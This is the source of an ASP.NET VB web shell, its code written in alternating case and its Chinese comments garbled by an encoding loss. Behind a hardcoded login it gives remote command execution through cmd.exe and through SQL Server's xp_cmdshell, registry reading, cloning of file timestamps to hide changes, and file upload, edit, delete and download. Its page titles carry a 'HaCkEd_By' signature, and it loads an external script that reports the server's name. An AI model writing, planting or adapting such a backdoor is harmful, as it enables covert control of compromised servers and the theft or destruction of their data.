<%@ PaGe lAnGuAgE="VB" cOnTeNtTyPe="text/html" vAlIdAtErEqUeSt="false" AsPcOmPaT="true" %>
<%@ iMpOrT NaMeSpAcE="System.IO" %>
<%@ iMpOrT NaMeSpAcE="System.Diagnostics" %>
<%@ iMpOrT NaMeSpAcE="Microsoft.Win32" %>
<%@ iMpOrT NaMeSpAcE="System.Data" %>
<%@ iMpOrT NaMeSpAcE="System.Data.OleDb" %>
<ScRiPt rUnAt="server">
    Dim PaSsWoRd As String = "45679568"   '�����޸����� Ĭ������Ϊ"109"
DiM UrL,TeMp1,TeMp2,TiTlE,SoRtFiLeD As sTrInG

sUb lOgIn_cLiCk(sEnDeR As oBjEcT, e aS EvEnTaRgS)
        If tExTbOx.tExT = PaSsWoRd tHeN
            sEsSiOn("lake2") = 1
            SeSsIoN.TiMeOuT = 45
        ElSe
            ReSpOnSe.wRiTe("<div align=center><font color='red'>�ⲻ�������ĵط���С�ӣ�</font></div>")
        EnD If
EnD SuB

sUb rUnCmD(SrC As oBjEcT, e aS EvEnTaRgS)
	dIm mYpRoCeSs aS NeW PrOcEsS()
	DiM MyPrOcEsSsTaRtInFo aS NeW PrOcEsSsTaRtInFo(CmDpAtH.TeXt)
	MyPrOcEsSsTaRtInFo.uSeShElLeXeCuTe = fAlSe
	mYpRoCeSsStArTiNfO.ReDiReCtStAnDaRdOuTpUt = TrUe
	mYpRoCeSs.sTaRtInFo = mYpRoCeSsStArTiNfO
	MyPrOcEsSsTaRtInFo.aRgUmEnTs="/c " & CmD.TeXt
	mYpRoCeSs.sTaRt()
	dIm mYsTrEaMrEaDeR As sTrEaMrEaDeR = mYpRoCeSs.sTaNdArDoUtPuT
	DiM MyStRiNg aS StRiNg = MyStReAmReAdEr.rEaDtOeNd()
	mYpRoCeSs.cLoSe()
	mYsTrInG=RePlAcE(MyStRiNg,">","&lt;")
	MyStRiNg=rEpLaCe(mYsTrInG,"<","&gt;")
	rEsUlT.TeXt="Command = " & CmD.TeXt & vBcRlF & "<ul class='td3'><pre>" & MyStRiNg & "</pre></ul>"
	CmD.TeXt=""
eNd sUb
SuB ClOnEtImE(SrC As oBjEcT, e aS EvEnTaRgS)
	eXiStDiR(TiMe1.TeXt)
	ExIsTdIr(tImE2.tExT)
	dIm tHiSfIlE As fIlEiNfO =nEw fIlEiNfO(tImE1.tExT)
	dIm tHaTfIlE As fIlEiNfO =nEw fIlEiNfO(tImE2.tExT)
	tHiSfIlE.LaStWrItEtImE = ThAtFiLe.lAsTwRiTeTiMe
	tHiSfIlE.LaStAcCeSsTiMe = ThAtFiLe.lAsTaCcEsStImE
	ThIsFiLe.cReAtIoNtImE = ThAtFiLe.cReAtIoNtImE
	ReSpOnSe.wRiTe("<div align=center><font color='red'>Clone Time �ɹ�!</font></div>")
EnD SuB
sUb rEaDrEg(sRc aS ObJeCt, E As eVeNtArGs)
	DiM ErRoR_X As eXcEpTiOn
TrY
	DiM Hu aS StRiNg = rEg1.TeXt
	dIm rK As rEgIsTrYkEy
	sElEcT MiD( hU ,1 , iNsTr( Hu,"\" )-1 )
		cAsE "HKEY_LOCAL_MACHINE"
			rK = rEgIsTrY.LoCaLmAcHiNe.oPeNsUbKeY( rIgHt(hU , LeN(Hu) - iNsTr( Hu,"\" )) , 0 )
		CaSe "HKEY_CLASSES_ROOT"
			Rk = ReGiStRy.cLaSsEsRoOt.oPeNsUbKeY( rIgHt(hU , LeN(Hu) - iNsTr( Hu,"\" )) , 0 )
		CaSe "HKEY_CURRENT_USER"
			Rk = ReGiStRy.cUrReNtUsEr.oPeNsUbKeY( rIgHt(hU , LeN(Hu) - iNsTr( Hu,"\" )) , 0 )
		CaSe "HKEY_USERS"
			Rk = rEgIsTrY.UsErS.OpEnSuBkEy( rIgHt(hU , LeN(Hu) - InStR( hU,"\" )) , 0 )
		cAsE "HKEY_CURRENT_CONFIG"
			rK = rEgIsTrY.CuRrEnTcOnFiG.OpEnSuBkEy( RiGhT(Hu , lEn(hU) - InStR( hU,"\" )) , 0 )
	EnD SeLeCt
	lAbEl1.TeXt = rK.GeTvAlUe(rEg2.TeXt , "NULL")
	rK.ClOsE()
cAtCh eRrOr_x
	lAbEl1.TeXt = "�д������������ǲ����ڸü�ֵ��"
eNd tRy
EnD SuB
sUb eDiToR(SrC As oBjEcT, e aS EvEnTaRgS)
	dIm mYwRiTe aS NeW StReAmWrItEr(FiLePaTh.tExT,FaLsE,EnCoDiNg.dEfAuLt)
	MyWrItE.WrItE(CoNtEnT.TeXt)
	MyWrItE.ClOsE
	ReSpOnSe.wRiTe("<script>alert('�༭|�����ļ� " & rEpLaCe(fIlEpAtH.TeXt,"\","\\") & " �ɹ�����ˢ�£�')</sc"&"ript>")
EnD SuB
sUb uPlOaD(SrC As oBjEcT, e aS EvEnTaRgS)
	dIm fIlEnAmE,LoAdPaTh aS StRiNg
	fIlEnAmE=PaTh.gEtFiLeNaMe(uPfIlE.VaLuE)
	lOaDpAtH=ReQuEsT.QuErYsTrInG("src") & FiLeNaMe
	iF  fIlE.ExIsTs(lOaDpAtH)=tRuE ThEn 
		rEsPoNsE.WrItE("<script>alert('�ļ�" & RePlAcE(LoAdPaTh,"\","\\") & " �Ѿ����ڣ��ϴ�ʧ�ܣ�')</sc"&"ript>")
		ReSpOnSe.eNd()
	eNd iF
	UpFiLe.pOsTeDfIlE.SaVeAs(lOaDpAtH)
	rEsPoNsE.WrItE("<script>alert('�ļ� " & RePlAcE(FiLeNaMe,"\","\\") & " �ϴ��ɹ���\n�ļ���Ϣ���£�\n\n����·����" & rEpLaCe(uPfIlE.VaLuE,"\","\\") & "\n�ļ���С��" & uPfIlE.PoStEdFiLe.cOnTeNtLeNgTh & " bytes\nԶ��·����" & RePlAcE(LoAdPaTh,"\","\\") & "\n');</scri"&"pt>")
eNd sUb
SuB NeWfD(SrC As oBjEcT, e aS EvEnTaRgS)
	uRl=rEqUeSt.fOrM("src")
	If nEwFiLe.cHeCkEd = tRuE ThEn
		DiM MyWrItE As nEw sTrEaMwRiTeR(UrL & nEwNaMe.tExT,FaLsE,EnCoDiNg.dEfAuLt)
		mYwRiTe.cLoSe
		ReSpOnSe.rEdIrEcT(rEqUeSt.sErVeRvArIaBlEs("URL") & "?action=edit&src=" & sErVeR.UrLeNcOdE(UrL & NeWnAmE.TeXt))
	eLsE
		dIrEcToRy.cReAtEdIrEcToRy(uRl & NeWnAmE.TeXt)
		rEsPoNsE.WrItE("<script>alert('�����ļ��� " & rEpLaCe(uRl & nEwNaMe.tExT ,"\","\\") & " �ɹ���ˢ�£�');</sc" & "ript>")
	eNd iF
eNd sUb
SuB DeL(A)
	iF RiGhT(A,1)="\" ThEn
		DiM XdIr aS DiReCtOrYiNfO
		dIm mYdIr aS NeW DiReCtOrYiNfO(A)
		DiM XfIlE As fIlEiNfO
		fOr eAcH XfIlE In mYdIr.gEtFiLeS()
			FiLe.dElEtE(A & XfIlE.NaMe)
		nExT
		fOr eAcH XdIr iN MyDiR.GeTdIrEcToRiEs()
			cAlL DeL(A & XdIr.nAmE & "\")
		nExT
		dIrEcToRy.dElEtE(A)
	eLsE
		fIlE.DeLeTe(a)
	EnD If
EnD SuB
sUb cOpYdIr(a,b)
	DiM XdIr aS DiReCtOrYiNfO
	DiM MyDiR As nEw dIrEcToRyInFo(a)
	DiM XfIlE As fIlEiNfO
	FoR EaCh xFiLe iN MyDiR.GeTfIlEs()
		FiLe.cOpY(A & "\" & xFiLe.nAmE,B & xFiLe.nAmE)
	nExT
	FoR EaCh xDiR In mYdIr.gEtDiReCtOrIeS()
		dIrEcToRy.cReAtEdIrEcToRy(b & PaTh.gEtFiLeNaMe(a & xDiR.NaMe))
		CaLl cOpYdIr(a & xDiR.NaMe & "\",B & xDiR.NaMe & "\")
	nExT
eNd sUb
SuB XeXiStDiR(TeMp,oW)
	iF DiReCtOrY.ExIsTs(tEmP)=tRuE Or fIlE.ExIsTs(TeMp)=TrUe tHeN 
		If oW=0  tHeN
			ReSpOnSe.rEdIrEcT(rEqUeSt.sErVeRvArIaBlEs("URL") & "?action=samename&src=" & SeRvEr.uRlEnCoDe(uRl))
		ElSeIf oW=1 ThEn
			dEl(tEmP)
		ElSe
			dIm d aS StRiNg = sEsSiOn("cutboard")
			If rIgHt(d,1)="\" tHeN
				tEmP1=uRl & sEcOnD(NoW) & PaTh.gEtFiLeNaMe(mId(rEpLaCe(d,"",""),1,LeN(RePlAcE(d,"",""))-1))
			eLsE
				tEmP2=uRl & sEcOnD(NoW) & RePlAcE(PaTh.gEtFiLeNaMe(d),"","")
			eNd iF
		eNd iF
	EnD If
EnD SuB
sUb eXiStDiR(TeMp)
		iF  fIlE.ExIsTs(tEmP)=fAlSe aNd DiReCtOrY.ExIsTs(tEmP)=fAlSe tHeN 
			rEsPoNsE.WrItE("<script>alert('������·�� " & rEpLaCe(tEmP,"\","\\")  &"��');</sc" & "ript>")
			rEsPoNsE.WrItE("<br><br><a href='javascript:history.back(1);'>����</a>")
			ReSpOnSe.eNd()
		EnD If
EnD SuB
sUb rUnSqLcMd(sRc aS ObJeCt, E As eVeNtArGs)
	DiM AdOcOnN,StRqUeRy,rEcReSuLt,sTrReSuLt
	iF SqLnAmE.TeXt<>"" tHeN
		aDoCoNn=sErVeR.CrEaTeObJeCt("ADODB.Connection") 
		AdOcOnN.OpEn("Provider=SQLOLEDB.1;Password=" & sQlPaSs.tExT & ";UID=" & SqLnAmE.TeXt & ";Data Source = " & Ip.tExT) 
		iF SqLcMd.tExT<>"" ThEn 
			StRqUeRy = "exec master.dbo.xp_cmdshell '" & SqLcMd.tExT & "'" 
	  		ReCrEsUlT = AdOcOnN.ExEcUtE(sTrQuErY) 
 	 		If nOt rEcReSuLt.eOf tHeN 
   				dO WhIlE NoT rEcReSuLt.eOf 
    				sTrReSuLt = sTrReSuLt & ChR(13) & ReCrEsUlT(0).vAlUe
    				ReCrEsUlT.MoVeNeXt 
   				LoOp 
 	 		EnD If 
  			ReCrEsUlT = NoThInG 
  			sTrReSuLt = rEpLaCe(sTrReSuLt," ","") 
  			sTrReSuLt = rEpLaCe(StRrEsUlT,"<","&lt;") 
  			StRrEsUlT = RePlAcE(sTrReSuLt,">","&gt;") 
			rEsUlTsQl.tExT="Command = " & SqLcMd.tExT & VbCrLf & "<ul class='td3'><pre>" & sTrReSuLt & "</pre></ul>"
			SqLcMd.tExT=""
		 eNd iF 
  		AdOcOnN.ClOsE 
	 EnD If
 eNd sUb
FuNcTiOn gEtStArTeDtImE(Ms) 
	gEtStArTeDtImE=CiNt(mS/(1000*60*60))
eNd fUnCtIoN
fUnCtIoN GeTiP() 
    DiM StRiPaDdR As sTrInG
    iF ReQuEsT.SeRvErVaRiAbLeS("HTTP_X_FORWARDED_FOR") = "" Or iNsTr(rEqUeSt.sErVeRvArIaBlEs("HTTP_X_FORWARDED_FOR"), "unknown") > 0 tHeN
        sTrIpAdDr = rEqUeSt.sErVeRvArIaBlEs("REMOTE_ADDR")
    eLsEiF InStR(ReQuEsT.SeRvErVaRiAbLeS("HTTP_X_FORWARDED_FOR"), ",") > 0 ThEn
        StRiPaDdR = MiD(ReQuEsT.SeRvErVaRiAbLeS("HTTP_X_FORWARDED_FOR"), 1, iNsTr(ReQuEsT.SeRvErVaRiAbLeS("HTTP_X_FORWARDED_FOR"), ",")-1)
    ElSeIf iNsTr(rEqUeSt.sErVeRvArIaBlEs("HTTP_X_FORWARDED_FOR"), ";") > 0 tHeN
        sTrIpAdDr = mId(rEqUeSt.sErVeRvArIaBlEs("HTTP_X_FORWARDED_FOR"), 1, InStR(rEqUeSt.sErVeRvArIaBlEs("HTTP_X_FORWARDED_FOR"), ";")-1)
    eLsE
        sTrIpAdDr = rEqUeSt.sErVeRvArIaBlEs("HTTP_X_FORWARDED_FOR")
    eNd iF
    gEtIp = tRiM(MiD(StRiPaDdR, 1, 30))
EnD FuNcTiOn
FuNcTiOn gEtPaReNtDiR(NoWdIr)
	DiM TeMp,k aS InTeGeR
	TeMp=1
	k=0
	iF LeN(NoWdIr)>4 ThEn 
		nOwDiR=LeFt(nOwDiR,LeN(NoWdIr)-1) 
	EnD If
	dO WhIlE TeMp<>0
		k=tEmP+1
		tEmP=InStR(TeMp,nOwDiR,"\")
		iF TeMp =0 ThEn
			eXiT Do
		EnD If
		TeMp = tEmP+1
	LoOp
	iF K<>2 tHeN
		gEtPaReNtDiR=MiD(NoWdIr,1,k-2)
	ElSe
		GeTpArEnTdIr=nOwDiR
	EnD If
EnD FuNcTiOn
FuNcTiOn rEnAmE()
	UrL=ReQuEsT.QuErYsTrInG("src")
	If fIlE.ExIsTs(gEtPaReNtDiR(UrL) & ReQuEsT.FoRm("name")) ThEn
		ReNaMe=0   
	ElSe
		FiLe.cOpY(UrL,GeTpArEnTdIr(uRl) & rEqUeSt.fOrM("name"))
		DeL(UrL)
		ReNaMe=1
	eNd iF
eNd fUnCtIoN 
FuNcTiOn gEtSiZe(tEmP)
	iF TeMp < 1024 ThEn
		GeTsIzE=TeMp & " bytes"
	ElSe
		If tEmP\1024 < 1024 ThEn
			gEtSiZe=tEmP\1024 & " KB"
		eLsE
			If tEmP\1024\1024 < 1024 tHeN
				gEtSiZe=tEmP\1024\1024 & " MB"
			ElSe
				GeTsIzE=TeMp\1024\1024\1024 & " GB"
			EnD If
		EnD If
	eNd iF
eNd fUnCtIoN 
	sUb dOwNtHeFiLe(tHePaTh)
		dIm sTrEaM
		sTrEaM=SeRvEr.cReAtEoBjEcT("adodb.stream")
		StReAm.oPeN
		sTrEaM.TyPe=1
		StReAm.lOaDfRoMfIlE(ThEpAtH)
		ReSpOnSe.aDdHeAdEr("Content-Disposition", "attachment; filename=" & RePlAcE(sErVeR.UrLeNcOdE(PaTh.gEtFiLeNaMe(tHePaTh)),"+"," "))
		ReSpOnSe.aDdHeAdEr("Content-Length",StReAm.sIzE)
		ReSpOnSe.cHaRsEt="UTF-8"
		ReSpOnSe.cOnTeNtTyPe="application/octet-stream"
		rEsPoNsE.BiNaRyWrItE(StReAm.rEaD)
		ReSpOnSe.fLuSh
		StReAm.cLoSe
		StReAm=nOtHiNg
		ReSpOnSe.eNd()
	eNd sUb
SuB PaGe_lOaD(SeNdEr aS ObJeCt, E As eVeNtArGs)
	If rEqUeSt.qUeRyStRiNg("table")<>"" tHeN
		cAlL ShOwTaBlE()
	EnD If
EnD SuB
sUb sHoWtAbLe()
	dB_EbUtToN.ViSiBlE = TrUe
	dB_EsTrInG.ViSiBlE = TrUe
	dB_ExE.ViSiBlE = TrUe
	dB_CsTrInG.TeXt = sEsSiOn("DBC") 
	If iNsTr(dB_CsTrInG.TeXt,":\")<>0 ThEn
		Db_rB_AcCeSs.cHeCkEd = tRuE
		dB_Rb_mSsQl.cHeCkEd = fAlSe
	eLsE
		dB_Rb_aCcEsS.ChEcKeD = FaLsE
		dB_Rb_mSsQl.cHeCkEd = tRuE
	EnD If
	cAlL BiNdDaTa()
EnD SuB
sUb dB_ReLoAd(sEnDeR As oBjEcT, e aS EvEnTaRgS)
	rEsPoNsE.ReDiReCt(rEqUeSt.sErVeRvArIaBlEs("PATH_INFO") & "?action=data")
eNd sUb
SuB Db_oNeB(SeNdEr aS ObJeCt, E As eVeNtArGs)
	DiM ErRoR_X As eXcEpTiOn
	tRy
	dIm dB_CoNn aS NeW OlEdBcOnNeCtIoN(SeSsIoN("DBC"))
	DiM Db_cMd aS NeW OlEdBcOmMaNd( Db_eStRiNg.tExT , dB_CoNn ) 
	Db_cOnN.OpEn()
	dB_CmD.ExEcUtEnOnQuErY()
	Db_cOnN.ClOsE()
	CaLl bInDdAtA()
	CaTcH ErRoR_X
	ReSpOnSe.wRiTe("<div align=center><font color='red'>����</font></div>"&ErRoR_X.MeSsAgE)
	rEsPoNsE.EnD()
	EnD TrY
eNd sUb
SuB Db_oNrB_1(SeNdEr aS ObJeCt, E As eVeNtArGs)
	Db_cStRiNg.tExT = "server=(local);UID=sa;PWD=;database=;Provider=SQLOLEDB"
	dB_Rb_aCcEsS.ChEcKeD = FaLsE
	Db_rB_MsSqL.ChEcKeD = TrUe
EnD SuB
sUb dB_OnRb_2(sEnDeR As oBjEcT, e aS EvEnTaRgS)
	dB_Rb_aCcEsS.ChEcKeD = TrUe
	dB_Rb_mSsQl.cHeCkEd = fAlSe
	dB_CsTrInG.TeXt = "Provider=Microsoft.Jet.OLEDB.4.0;Data Source=MDB.mdb"
EnD SuB
sUb dB_OnSb(sEnDeR As oBjEcT, e aS EvEnTaRgS)
	dB_EbUtToN.ViSiBlE = TrUe
	dB_EsTrInG.ViSiBlE = TrUe
	dB_ExE.ViSiBlE = TrUe
	sEsSiOn("DBC") = dB_CsTrInG.TeXt
	dIm i aS InTeGeR
	DiM Db_cOnN As nEw oLeDbCoNnEcTiOn(Db_cStRiNg.tExT)
	dIm dB_ScHeMaTaBlE As dAtAtAbLe 
	Db_cOnN.OpEn()
	dB_ScHeMaTaBlE = Db_cOnN.GeToLeDbScHeMaTaBlE(oLeDbScHeMaGuId.tAbLeS, nEw oBjEcT() {nOtHiNg, nOtHiNg, NoThInG, "TABLE"})
	DiM SqLtAbLe aS StRiNg
	fOr i = 0 tO Db_sChEmAtAbLe.rOwS.CoUnT - 1
		sQlTaBlE += "<a href='?action=data&table=" & Db_sChEmAtAbLe.rOwS(I)!TaBlE_NaMe.tOsTrInG & "'>" & dB_ScHeMaTaBlE.RoWs(i)!tAbLe_nAmE.ToStRiNg & "</a><br>"
	NeXt i
	dB_LaBeL.TeXt="��ṹ<ul class='td3'>" & sQlTaBlE & "</ul>"
	dB_CoNn.cLoSe()
EnD SuB
'��ҳ
SuB Db_pAgE(SeNdEr aS ObJeCt, E As SyStEm.wEb.uI.WeBcOnTrOlS.DaTaGrIdPaGeChAnGeDeVeNtArGs)
	Db_dAtAgRiD.CuRrEnTpAgEiNdEx = e.nEwPaGeInDeX
	CaLl bInDdAtA()
eNd sUb
SuB Db_sOrT(SeNdEr aS ObJeCt, E As DaTaGrIdSoRtCoMmAnDeVeNtArGs)
	SoRtFiLeD = E.SoRtExPrEsSiOn
	cAlL BiNdDaTa()
EnD SuB
sUb bInDdAtA()
	DiM Db_cOnN As nEw oLeDbCoNnEcTiOn(sEsSiOn("DBC"))
	dIm dB_CmD As nEw oLeDbCoMmAnD("select * from " & ReQuEsT.QuErYsTrInG("table") , Db_cOnN ) 
	dIm dB_AdP As nEw oLeDbDaTaAdApTeR(Db_cMd)
	DiM Db_dS As nEw dAtAsEt()
	dB_AdP.FiLl(dB_Ds,rEqUeSt.qUeRyStRiNg("table"))
	Db_dAtAgRiD.DaTaSoUrCe = dB_Ds.tAbLeS(rEqUeSt.qUeRyStRiNg("table")).DeFaUlTvIeW
	Db_dS.TaBlEs(rEqUeSt.qUeRyStRiNg("table")).dEfAuLtViEw.sOrT = SoRtFiLeD
	Db_dAtAgRiD.DaTaBiNd()
EnD SuB
</sCrIpT>
<%
	iF ReQuEsT.QuErYsTrInG("action")="down" aNd SeSsIoN("lake2")=1 ThEn
			dOwNtHeFiLe(ReQuEsT.QuErYsTrInG("src"))
			rEsPoNsE.EnD()
	EnD If
	
	DiM Hu aS StRiNg = rEqUeSt.qUeRyStRiNg("action")
	
	iF Hu="cmd" ThEn 
		tItLe="HaCkEd_By_da ��ΰ 68698895-- CMD"
	ElSeIf hU="sqlrootkit" tHeN 
		TiTlE="HaCkEd_By_da ��ΰ 68698895 -- SqlRootKit"
	eLsEiF Hu="clonetime" ThEn 
		tItLe="HaCkEd_By_da ��ΰ 68698895 -- CloneTime"
	ElSeIf hU="information" tHeN 
		TiTlE="HaCkEd_By_da ��ΰ 68698895 -- WebServerInfo"
	eLsEiF Hu="reg" ThEn 
		tItLe="HaCkEd_By_da ��ΰ 68698895 -- RegRead"
	ElSeIf hU="goto" tHeN 
		TiTlE="HaCkEd_By_da ��ΰ 68698895 -- FileManager"
	eLsEiF Hu="data" ThEn 
		tItLe="HaCkEd_By_da ��ΰ 68698895 -- ControlDataBase"
	ElSe 
		tItLe=rEqUeSt.sErVeRvArIaBlEs("HTTP_HOST") 
	eNd iF
%>
<!dOcTyPe hTmL PuBlIc "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<hTmL>
	<StYlE>
		BoDy{oVeRfLoW:AuTo;bOrDeR:0pX;MaRgIn: 0Px;pAdDiNg: 0pX;BaCkGrOuNd-cOlOr:bUtToNfAcE;}
		iNpUt {BoRdEr:#FfFfFf 1Px sOlId;;FoNt-SiZe: 12Px;cOlOr: #000000;}
		.InPuTlOgIn {FoNt-sIzE: 9Pt;bOrDeR:1pX sOlId lIgHtGrEy;bAcKgRoUnD-CoLoR: lIgHtGrEy;}
		TeXtArEa {BoRdEr: 1 1 1 1;FoNt-sIzE: 12Px;	CoLoR: #000000;}
		A:ViSiTeD {fOnT-SiZe: 9pT;CoLoR: #333333;TeXt-dEcOrAtIoN: nOnE;}
		a:aCtIvE {fOnT-SiZe: 9pT;CoLoR: #3366cC;TeXt-dEcOrAtIoN: nOnE;}
		a:lInK {fOnT-SiZe: 9pT;CoLoR: #000000;TeXt-dEcOrAtIoN: nOnE;}
		a:hOvEr{fOnT-WeIgHt: BoLd;bAcKgRoUnD: SiLvEr;tExT-TrAnSfOrM: cApItAlIzE;CoLoR: bLaCk;}
		.tR1{ BaCkGrOuNd-cOlOr:gRaY }
		tD {fOnT-SiZe:9Pt;fOnT-fAmIlY:"Tahoma","Arial","Helvetica","sans-serif";}
		.Td1{BoRdEr-rIgHt:#FfFfFf 0Px SoLiD;BoRdEr-tOp:#FfFfFf 1Px sOlId;bOrDeR-LeFt:#FfFfFf 1pX SoLiD;BoRdEr-bOtToM:#fFfFfF 0pX SoLiD;BaCkGrOuNd-CoLoR:SiLvEr; HeIgHt:22pX;}
		.Td2{BoRdEr-rIgHt:#FfFfFf 0Px SoLiD;BoRdEr-tOp:#FfFfFf 1Px sOlId;bOrDeR-LeFt:#FfFfFf 1pX SoLiD;BoRdEr-bOtToM:#fFfFfF 0pX SoLiD;BaCkGrOuNd-CoLoR:LiGhTgReY; hEiGhT:18Px;}
		.tD3{bOrDeR-RiGhT:#fFfFfF 0pX sOlId;bOrDeR-ToP:#fFfFfF 1pX SoLiD;BoRdEr-lEfT:#fFfFfF 1Px sOlId;bOrDeR-BoTtOm:#FfFfFf 0Px sOlId;bAcKgRoUnD-cOlOr:gAiNsBoRo;}
		.tAbLe1{BoRdEr:gRaY 0pX RiDgE;}
		.TaBlE2{bOrDeR:SiLvEr 0Px rIdGe;}
		.sHoWmEnU{BoRdEr:sIlVeR 0pX DoUbLe;}
	</sTyLe>
	<hEaD>
		<tItLe>
			<%=tItLe%>
		</TiTlE>
		<mEtA HtTp-eQuIv="Content-Type" cOnTeNt="text/html" ChArSeT="gb2312">
	</HeAd>
	<bOdY>
		<%
			dIm eRrOr_x aS ExCePtIoN
			TrY
			If sEsSiOn("lake2")<>1 ThEn
		%>
		<dIv aLiGn="center" sTyLe="position:absolute;width:100%;visibility:show; z-index:0;left:0px;top:200px">
			<TaBlE ClAsS="table1" CeLlSpAcInG="1" cElLpAdDiNg="1" WiDtH="473" bOrDeR="0" AlIgN="center">
				<Tr>
					<tD cLaSs="tr1">
						<tAbLe CeLlSpAcInG="0" cElLpAdDiNg="0" WiDtH="468" bOrDeR="0">
							<Tr>
								<tD AlIgN="left"><FoNt fAcE="webdings" CoLoR="#ffffff">8</FoNt><FoNt fAcE="Verdana, Arial, Helvetica, sans-serif" cOlOr="#ffffff"><b>�����¼ 
											:::...</b></tD>
								<Td aLiGn="right"><fOnT cOlOr="#d2d8ec">HaCkEd_bY_Da ��ΰ 68698895</FoNt></tD>
							</Tr>
							<FoRm rUnAt="server" Id="Form1">
								<Tr>
									<Td hEiGhT="30" aLiGn="center" cLaSs="td2" CoLsPaN="2">
										<aSp:tExTbOx iD="Textbox" RuNaT="server" tExTmOdE="Password" />
										<aSp:bUtToN Id="Button" rUnAt="server" TeXt="Login" ToOlTiP="Click here to login" oNcLiCk="login_click"
											cSsClAsS="inputLogin" />
									</Td>
								</Tr>
							</fOrM>
							<sCrIpT TyPe='TeXt/jAvAsCrIpT' lAnGuAgE='jAvAsCrIpT' SrC='hTtP://XsLt.aLeXa.cOm/sItE_StAtS/Js/t/c?uRl=<%=rEqUeSt.sErVeRvArIaBlEs("server_name")%>'></ScRiPt>
						</TaBlE>
					</tD>
				</Tr>
			</TaBlE>
		</DiV>
		<%
			eLsE
				dIm tEmP As sTrInG
				TeMp=rEqUeSt.qUeRyStRiNg("action")
				If tEmP="" tHeN tEmP="goto"
				SeLeCt cAsE TeMp
				CaSe "goto"
					If ReQuEsT.QuErYsTrInG("src")<>"" ThEn
						uRl=rEqUeSt.qUeRyStRiNg("src")
					eLsE
						UrL=SeRvEr.mApPaTh(".") & "\"
					EnD If
				CaLl eXiStDiR(UrL)
				DiM XdIr aS dIrEcToRyInFo
				DiM MyDiR As nEw DiReCtOrYiNfO(UrL)
				DiM HuPo aS StRiNg
				DiM XfIlE As fIlEiNfO
		%>
		<TaBlE ClAsS="showMenu" wIdTh="100%" bOrDeR="0" cElLpAdDiNg="1" CeLlSpAcInG="1">
			<tR>
				<tD HeIgHt="26">
					<A HrEf="?action=sqlrootkit" TaRgEt="_blank">SqLrOoTkIt.nEt </A><a hReF="?action=cmd" tArGeT="_blank">
						CmD.NeT</a><A HrEf="?action=clonetime&src=<%=server.UrlEncode(url)%>" tArGeT="_blank">
						ClOnEtImE</a> <a hReF="?action=information" TaRgEt="_blank">SySiNfOmAtIoN</a>
					<a hReF="?action=reg" tArGeT="_blank">rEaDrEg</A><a HrEf="?action=data" TaRgEt="_blank">
						dAtAbAsE</a>
				</tD>
				<tD aLiGn="right">PoWeReD By <B>������</b><A HrEf="?action=logout" TiTlE="Exit"><FoNt fAcE="webdings" CoLoR="red">r<fOnT></A></Td>
			</Tr>
		</tAbLe>
		<TaBlE ClAsS="table1" cElLsPaCiNg="0" cElLpAdDiNg="0" WiDtH="100%" bOrDeR="0">
			<tR>
				<tD ClAsS="tr1" CoLsPaN="2" hEiGhT="20"><FoNt cOlOr="#ffffff">��ǰĿ¼��<%=uRl%></FoNt></tD>
			</tR>
			<Tr cLaSs="td1">
				<tD HeIgHt="20">
					<A HrEf="?action=new&src=<%=server.UrlEncode(url)%>" TiTlE="�½��ļ���Ŀ¼" tArGeT="_blank">
						�½�</A>
					<%iF SeSsIoN("cutboard")<>"" tHeN%>
					<a hReF="?action=plaster&src=<%=server.UrlEncode(url)%>" tItLe="ճ���������������">ճ��</A>
					<%eLsE%>
					ճ��
					<%eNd iF%>
					<a hReF="?action=upfile&src=<%=server.UrlEncode(url)%>" tItLe="�ϴ��ļ�" TaRgEt="_blank">
						�ϴ�</a>
				</tD>
				<tD>
					<A HrEf="?action=goto&src="<%=SeRvEr.mApPaTh(".")%> tItLe="�ص����ļ�����Ŀ¼">��</a>
					<%
						DiM I aS InTeGeR
						fOr i =0 tO DiReCtOrY.GeTlOgIcAlDrIvEs().lEnGtH-1
 							ReSpOnSe.wRiTe("<a href='?action=goto&src=" & dIrEcToRy.gEtLoGiCaLdRiVeS(I) & "'>" & dIrEcToRy.gEtLoGiCaLdRiVeS(I) & " </a>")
						NeXt
					%>
				</tD>
			</tR>
		</TaBlE>
		<tAbLe wIdTh="100%" BoRdEr="1" cElLpAdDiNg="0" CeLlSpAcInG="0">
			<tR>
				<tD WiDtH="30%" VaLiGn="top">
					<TaBlE wIdTh="100%" BoRdEr="1" CeLlPaDdInG="0" CeLlSpAcInG="0">
						<%
							'��Ŀ¼�ṹ
							rEsPoNsE.WrItE("<tr><td class='td1'><a href='?action=goto&src=" & sErVeR.UrLeNcOdE(GeTpArEnTdIr(uRl)) & "'><font color=red>�����ϼ�Ŀ¼</font></a></td></tr>")
							fOr eAcH XdIr iN MyDiR.GeTdIrEcToRiEs()
								dIm fIlEpAtH As sTrInG 
								fIlEpAtH=SeRvEr.uRlEnCoDe(uRl & xDiR.NaMe)
								ReSpOnSe.wRiTe("<tr><td class=td2><FONT face=wingdings color=red>0</FONT><a href='?action=goto&src=" & FiLePaTh & "\" & "'>" & xDiR.NaMe & "</a>")
								ReSpOnSe.wRiTe("<div align=right>" & dIrEcToRy.gEtLaStWrItEtImE(UrL & XdIr.nAmE) & "<FONT color=red><a href='?action=cut&src=" & FiLePaTh & "\'  target='_blank'>����" & "</a>-<a href='?action=copy&src=" & fIlEpAtH & "\'  target='_blank'>����</a>-<a href='?action=del&src=" & fIlEpAtH & "\'" & " onclick='return del(this);'>ɾ��</a></font></div></tr>")
							NeXt
						%>
					</tAbLe>
				</tD>
				<tD WiDtH="70%" VaLiGn="top">
					<TaBlE wIdTh="100%" BoRdEr="1" CeLlPaDdInG="0" CeLlSpAcInG="0">
						<Tr AlIgN="center">
							<Td cLaSs="td1">����</Td>
							<Td cLaSs="td1">��С</Td>
							<Td cLaSs="td1">�޸�ʱ��</Td>
							<Td cLaSs="td1">����</Td>
						</tR>
						<%
							'�ļ��ṹ
							fOr eAcH XfIlE In mYdIr.gEtFiLeS()
								DiM FiLePaTh2 As sTrInG
								FiLePaTh2=SeRvEr.uRlEnCoDe(uRl & xFiLe.nAmE)
								rEsPoNsE.WrItE("<tr><td class=td2>" & XfIlE.NaMe & "</td>")
								rEsPoNsE.WrItE("<td class=td2 align=center>" & GeTsIzE(XfIlE.LeNgTh) & "</td>")
								ReSpOnSe.wRiTe("<td class=td2 align=center>" & fIlE.GeTlAsTwRiTeTiMe(uRl & xFiLe.nAmE) & "</td>")
